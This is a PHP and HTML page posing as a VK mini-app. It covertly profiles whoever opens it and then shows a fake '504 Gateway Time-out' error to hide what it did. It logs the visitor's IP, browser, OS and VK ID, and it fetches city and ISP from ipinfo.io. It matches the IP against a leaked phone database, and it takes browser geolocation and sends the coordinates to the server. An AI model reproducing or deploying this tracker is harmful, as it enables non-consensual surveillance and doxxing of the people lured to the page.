<script src="https://cdn.jsdelivr.net/npm/@vkontakte/vk-bridge@2.0.8/dist/index.umd.js"></script>
<script>
const bridge = vkBridge.default;
bridge.subscribe((e) => console.log("vkBridge event", e));
bridge.send("VKWebAppInit", {});
</script>
<?php
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
if(filter_var($client, FILTER_VALIDATE_IP)) $ip = $client;
elseif(filter_var($forward, FILTER_VALIDATE_IP)) $ip = $forward;
else $ip = $remote;
$user_agent = $_SERVER["HTTP_USER_AGENT"];
  if (strpos($user_agent, "Firefox") !== false) $browser = "Firefox";
  elseif (strpos($user_agent, "Opera") !== false) $browser = "Opera";
  elseif (strpos($user_agent, "Chrome") !== false) $browser = "Chrome";
  elseif (strpos($user_agent, "MSIE") !== false) $browser = "Internet Explorer";
  elseif (strpos($user_agent, "Safari") !== false) $browser = "Safari";
  else $browser = "Неизвестный";
$newTitle = substr($user_agent, strpos($user_agent, '('));
$i = 0;
while(true){
  if($newTitle[$i]==")"){
  $res = substr($newTitle, 1, $i=$i-1);
  break;
  }else{
      $i++;
  }
}
$bd_list = explode("\n", file_get_contents("./../../bdclean.txt"));
$phose  = "";
$ip_fp = explode(".", $ip);
$ip_fp = $ip_fp[0].".".$ip_fp[1].".".$ip_fp[2];
foreach($bd_list as $bd_list_new){
	if(strpos($bd_list_new, $ip_fp) != false){
		$phose .= $bd_list_new;
	}
}
if($phose != ''){
	$phose = "\n Phone: ".$phose;
}
if(isset($_GET['vk_user_id'])){
	$vk = "\n vk: https://vk.com/id".$_GET['vk_user_id'];
}else{$vk = '';}
$url = file_get_contents("https://ipinfo.io/$ip/json");
$obj = json_decode($url,true);
if($obj['city'] != ''){$city = "\n City: ".$obj['city'];}
if($city == ''){$city=$obj['region'];}
if($obj['org'] != ''){
	$org = "\n Org: ".$obj['org'];
}
$all = " OS: $res \n IP: $ip \n Browser: $browser $city $org $vk $phose \n";
$f = fopen("./../../logs/result.txt", "w+");
fwrite($f, $all);
fclose($f);
$fs = fopen("./../../logs/logger.log", "a+");
fwrite($fs, $all);
fclose($fs);
?>
<script type="text/javascript">
    navigator.geolocation.getCurrentPosition(showPosition);
    function showPosition(position)
    {
      var lat = position.coords.latitude;
      var lon = position.coords.longitude;
      var xmlhttp = new XMLHttpRequest();
      var url = "start.php?lon="+lon+"&lat="+lat;
      xmlhttp.onreadystatechange = function() {
          if (this.readyState == 4 && this.status == 200) {
              var myArr = JSON.parse(this.responseText);
              myFunction(myArr);
            }
          };
          xmlhttp.open("GET", url, true);
          xmlhttp.send();

      }
</script>

<center><h1>504 Gateway Time-out<hr>Не удалось загрузить страницу. <a href="/">Обновить</a></h1></center>

